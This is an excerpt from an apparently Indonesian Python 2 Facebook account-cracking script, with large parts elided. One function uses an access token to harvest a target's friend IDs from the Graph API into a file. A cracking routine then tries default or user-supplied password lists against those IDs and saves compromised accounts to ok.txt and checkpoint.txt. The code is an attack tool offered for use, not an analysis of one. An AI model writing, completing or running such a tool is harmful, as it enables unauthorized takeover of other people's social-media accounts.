...
\033[0;95m     Coded By : \033[0;97mDapunta Khurayra X
\033[0;97m﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌""")
...
def publik():
	...
	try:
                ...
                print logo
                print ("\033[0;95m────────────────────────────────")
		print("\033[0;95m╔══\033[0;97m[•] Ketik \'me\' Jika Ingin Mengambil ID Dari Daftar Teman")
		idt = raw_input("\033[0;95m╠══\033[0;97m[•] User ID Target : ")
		try:
			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
			op = json.loads(jok.text)
			print("\033[0;95m╠══\033[0;97m[•] Name           : "+op["name"])
		except KeyError:
		...
		id = []
		z=json.loads(r.text)
		print("\033[0;95m╚══\033[0;97m[•] Getting ID ...")
		print ("\033[0;95m────────────────────────────────")
		...
		ys.close()
		print ("\033[0;95m────────────────────────────────")
		print ('\033[0;95m╔══\033[0;97m[•] Sukses Mengambil ID dari %s'%op['name'])
		print ("\033[0;95m╠══\033[0;97m[•] Total ID : %s"%(len(id)))
		print ("\033[0;95m╚══\033[0;97m[•] Output : %s"%qq)
                print ("\033[0;95m────────────────────────────────")
...
def crack():
	...
	def __init__(self):
		...
		self.cp=[]
		self.ko=0
		print("\033[0;95m╠══\033[0;97m[•] Crack With Pass Default Or Manual [d/m]")
		while True:
			f=raw_input("\033[0;95m╠══\033[0;97m[•] Pilih : ")
			if f=="":continue
			elif f=="m":
				try:
					while True:
						try:
							self.apk=raw_input("\033[0;95m╠══\033[0;97m[•] ID List File : ")
					...
					print ("   %s"%e)
					continue
				print ("\033[0;95m╠══\033[0;97m[•] Example : pass123,pass12345")
				self.pwlist()
				break
			elif f=="d":
				try:
					...
					continue
                                print ("\033[0;95m────────────────────────────────")
				print ("\033[0;95m╔══\033[0;97m[•] Crack Started...")
				print ("\033[0;95m╠══\033[0;97m[•] Account [OK] saved to : ok.txt")
				print ("\033[0;95m╚══\033[0;97m[•] Account [CP] saved to : checkpoint.txt")
                                print ("\033[0;95m────────────────────────────────")
				...
				break
	def pwlist(self):
		self.pw=raw_input("\033[0;95m╚══\033[0;97m[•] Password List : ").split(",")
		if len(self.pw) ==0:
			self.pwlist()
		else:
			for i in self.fl:
